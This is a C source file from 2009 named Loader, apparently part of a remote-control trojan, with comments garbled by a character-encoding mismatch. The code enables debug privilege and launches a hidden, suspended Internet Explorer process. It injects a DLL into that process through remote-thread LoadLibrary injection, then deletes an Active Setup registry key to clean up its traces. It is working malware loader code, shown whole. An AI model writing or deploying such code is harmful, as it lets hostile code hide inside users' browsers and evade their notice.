//////////////////////////////////////////////////////////////////////////
//FileName:	Loader
//Data:		2009-04-06
//REM:		DLL��Loader����
//////////////////////////////////////////////////////////////////////////

#pragma once
#pragma comment(linker, "/subsystem:windows /entry:main")
#include <Windows.h>
#define DLLNAME	"Dll.dll"
#define REGISTERCLEANSTRING	"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{NS517-0XQO-SKETCHER-19901117-GMAILCOM}"

//////////////////////////////////////////////////////////////////////////
//������������
//////////////////////////////////////////////////////////////////////////
//Ϊ�˱��գ����Ȩ��
BOOL AddPrivilege(void);
//��һ��IE���̣�����ע��
int IExcute(void);
//Զ��ע��IE
BOOL DllInject(int pid,const char* path);
//������
BOOL CleanJob();
//ж��
BOOL Dettach();

int main(int argc,char* argv[])
{
	if (argc==2 && stricmp(argv[1],"-unstall")==0)
	{
		Dettach();
	}

	//Ϊ�˱��գ����Ȩ��
	AddPrivilege();

	int pid = IExcute();

	if (pid==0)
	{
		return 0;
	}

	DllInject(pid,DLLNAME);

	CleanJob();

	return 0;
}
//////////////////////////////////////////////////////////////////////////
//Ϊ�˱��գ����Ȩ��
//////////////////////////////////////////////////////////////////////////
BOOL AddPrivilege(void)
{
	HANDLE	hToken;
	TOKEN_PRIVILEGES	tp;
	LUID	Luid;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&Luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = Luid;
	if (!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL))
	{
		return FALSE;
	}

	return TRUE;

}

//////////////////////////////////////////////////////////////////////////
//��һ��IE���̣�����ע��
//////////////////////////////////////////////////////////////////////////
int IExcute()
{
	PROCESS_INFORMATION	pi = {0};
	STARTUPINFO	si = {0};

	memset(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	pi.hProcess = SW_HIDE;

	//��һ��IE����
	CreateProcess(NULL,"C:\\Program Files\\Internet Explorer\\iexplore.exe",NULL,NULL,0,CREATE_SUSPENDED,NULL,NULL,&si,&pi);

	return pi.dwProcessId;
}

//////////////////////////////////////////////////////////////////////////
//Զ��ע��IE
//////////////////////////////////////////////////////////////////////////
BOOL DllInject(int pid,const char* path)
{
	HANDLE	hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE,FALSE,pid);

	int dwSize = lstrlen(path);
	dwSize++;

	LPVOID lpBuf = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE);
	if (lpBuf==NULL)
	{
		CloseHandle(hProcess);
		return FALSE;
	}
	DWORD dwWrite;
	if (WriteProcessMemory(hProcess,lpBuf,(LPVOID)path,dwSize,&dwWrite)==FALSE)
	{
		CloseHandle(hProcess);
		return FALSE;

	}
	else if (dwWrite!=dwSize)
	{
		VirtualFreeEx(hProcess,lpBuf,dwSize,MEM_DECOMMIT);
		CloseHandle(hProcess);
		return FALSE;
	}
	//�ؼ�API��Զ���̴߳���(��dwWrite�滻��ʡ�˸�int)
	HANDLE hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)LoadLibrary,lpBuf,0,&dwWrite);
	//�ȴ����ؽ���
	WaitForSingleObject(hThread,INFINITE);
	VirtualFreeEx(hProcess,lpBuf,dwSize,MEM_DECOMMIT);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//������
//////////////////////////////////////////////////////////////////////////
BOOL CleanJob()
{
	//ActiveX����������ɾ���˼�ֵ
	RegDeleteKey(HKEY_CURRENT_USER,REGISTERCLEANSTRING);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//ж�أ���Զ�̿����½�����ʾ
//////////////////////////////////////////////////////////////////////////
BOOL Dettach()
{
	return TRUE;
}